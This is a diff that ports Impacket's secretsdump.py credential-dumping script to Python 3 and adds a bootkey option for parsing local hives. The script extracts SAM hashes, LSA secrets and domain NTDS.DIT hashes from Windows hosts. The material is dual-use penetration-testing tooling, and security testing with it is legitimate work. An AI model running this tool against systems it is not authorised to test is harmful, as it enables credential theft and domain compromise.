@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# Copyright (c) 2003-2016 CORE Security Technologies
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -32,17 +32,19 @@
 #             the pieces together, plus some extra magic.
 #
 # https://github.com/gentilkiwi/kekeo/tree/master/dcsync
-# http://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
-# http://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
-# http://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
-# http://www.quarkslab.com/en-blog+read+13
+# https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
+# https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
+# https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
+# https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
 # https://code.google.com/p/creddump/
-# http://lab.mediaservice.net/code/cachedump.rb
-# http://insecurety.net/?p=768
+# https://lab.mediaservice.net/code/cachedump.rb
+# https://insecurety.net/?p=768
 # http://www.beginningtoseethelight.org/ntsecurity/index.htm
-# http://www.ntdsxtract.com/downloads/ActiveDirectoryOfflineHashDumpAndForensics.pdf
-# http://www.passcape.com/index.php?section=blog&cmd=details&id=15
+# https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
+# https://www.passcape.com/index.php?section=blog&cmd=details&id=15
 #
+from __future__ import division
+from __future__ import print_function
 import argparse
 import codecs
 import logging
@@ -54,6 +56,10 @@ from impacket.examples import logger
 from impacket.smbconnection import SMBConnection
 
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
+try:
+    input = raw_input
+except NameError:
+    pass
 
 class DumpSecrets:
     def __init__(self, remoteName, username='', password='', domain='', options=None):
@@ -72,6 +78,7 @@ class DumpSecrets:
         self.__NTDSHashes = None
         self.__LSASecrets = None
         self.__systemHive = options.system
+        self.__bootkey = options.bootkey
         self.__securityHive = options.security
         self.__samHive = options.sam
         self.__ntdsFile = options.ntds
@@ -106,23 +113,28 @@ class DumpSecrets:
             if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                 self.__isRemote = False
                 self.__useVSSMethod = True
-                localOperations = LocalOperations(self.__systemHive)
-                bootKey = localOperations.getBootKey()
-                if self.__ntdsFile is not None:
+                if self.__systemHive:
+                    localOperations = LocalOperations(self.__systemHive)
+                    bootKey = localOperations.getBootKey()
+                    if self.__ntdsFile is not None:
                     # Let's grab target's configuration about LM Hashes storage
-                    self.__noLMHash = localOperations.checkNoLMHashPolicy()
+                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
+                else:
+                    import binascii
+                    bootKey = binascii.unhexlify(self.__bootkey)
+
             else:
                 self.__isRemote = True
                 bootKey = None
                 try:
                     try:
                         self.connect()
-                    except:
+                    except Exception as e:
                         if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                             # SMBConnection failed. That might be because there was no way to log into the
                             # target system. We just have a last resort. Hope we have tickets cached and that they
                             # will work
-                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help')
+                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                             pass
                         else:
                             raise
@@ -134,7 +146,7 @@ class DumpSecrets:
                         bootKey             = self.__remoteOps.getBootKey()
                         # Let's check whether target system stores LM Hashes
                         self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-                except Exception, e:
+                except Exception as e:
                     self.__canProcessSAMLSA = False
                     if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                         and self.__doKerberos is True:
@@ -156,7 +168,7 @@ class DumpSecrets:
                     self.__SAMHashes.dump()
                     if self.__outputFileName is not None:
                         self.__SAMHashes.export(self.__outputFileName)
-                except Exception, e:
+                except Exception as e:
                     logging.error('SAM hashes extraction failed: %s' % str(e))
 
                 try:
@@ -173,10 +185,10 @@ class DumpSecrets:
                     self.__LSASecrets.dumpSecrets()
                     if self.__outputFileName is not None:
                         self.__LSASecrets.exportSecrets(self.__outputFileName)
-                except Exception, e:
+                except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
-                        print traceback.print_exc()
+                        traceback.print_exc()
                     logging.error('LSA hashes extraction failed: %s' % str(e))
 
             # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
@@ -196,10 +208,10 @@ class DumpSecrets:
                                            printUserStatus= self.__printUserStatus)
             try:
                 self.__NTDSHashes.dump()
-            except Exception, e:
+            except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
-                    print traceback.print_exc()
+                    traceback.print_exc()
                 if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                     # We don't store the resume file if this error happened, since this error is related to lack
                     # of enough privileges to access DRSUAPI.
@@ -214,15 +226,15 @@ class DumpSecrets:
                 elif self.__useVSSMethod is False:
                     logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
             self.cleanup()
-        except (Exception, KeyboardInterrupt), e:
+        except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
-                print traceback.print_exc()
+                traceback.print_exc()
             logging.error(e)
             if self.__NTDSHashes is not None:
                 if isinstance(e, KeyboardInterrupt):
                     while True:
-                        answer =  raw_input("Delete resume session file? [y/N] ")
+                        answer =  input("Delete resume session file? [y/N] ")
                         if answer.upper() == '':
                             answer = 'N'
                             break
@@ -255,22 +267,22 @@ class DumpSecrets:
 
 # Process command-line arguments.
 if __name__ == '__main__':
-    # Init the example's logger theme
-    logger.init()
     # Explicitly changing the stdout encoding format
     if sys.stdout.encoding is None:
         # Output is redirected to a file
         sys.stdout = codecs.getwriter('utf8')(sys.stdout)
 
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                       "the remote machine without executing any agent there.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                        ' (if you want to parse local files)')
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
+    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
     parser.add_argument('-security', action='store', help='SECURITY hive to parse')
     parser.add_argument('-sam', action='store', help='SAM hive to parse')
     parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
@@ -309,7 +321,7 @@ if __name__ == '__main__':
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                  'ommited it use the domain part (FQDN) specified in the target parameter')
     group.add_argument('-target-ip', action='store', metavar="ip address",
-                       help='IP Address of the target machine. If ommited it will use whatever was specified as target. '
+                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                             'This is useful when target is the NetBIOS name and you cannot resolve it')
 
     if len(sys.argv)==1:
@@ -318,8 +330,13 @@ if __name__ == '__main__':
 
     options = parser.parse_args()
 
+    # Init the example's logger theme
+    logger.init(options.ts)
+
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
 
@@ -331,7 +348,7 @@ if __name__ == '__main__':
     #In case the password contains '@'
     if '@' in remoteName:
         password = password + '@' + remoteName.rpartition('@')[0]
-        address = remoteName.rpartition('@')[2]
+        remoteName = remoteName.rpartition('@')[2]
 
     if options.just_dc_user is not None:
         if options.use_vss is True:
@@ -356,8 +373,8 @@ if __name__ == '__main__':
         sys.exit(1)
 
     if remoteName.upper() == 'LOCAL' and username == '':
-        if options.system is None:
-            logging.error('SYSTEM hive is always required for local parsing, check help')
+        if options.system is None and options.bootkey is None:
+            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
             sys.exit(1)
     else:
 
@@ -378,8 +395,8 @@ if __name__ == '__main__':
     dumper = DumpSecrets(remoteName, username, password, domain, options)
     try:
         dumper.dump()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
-            print traceback.print_exc()
+            traceback.print_exc()
         logging.error(e)
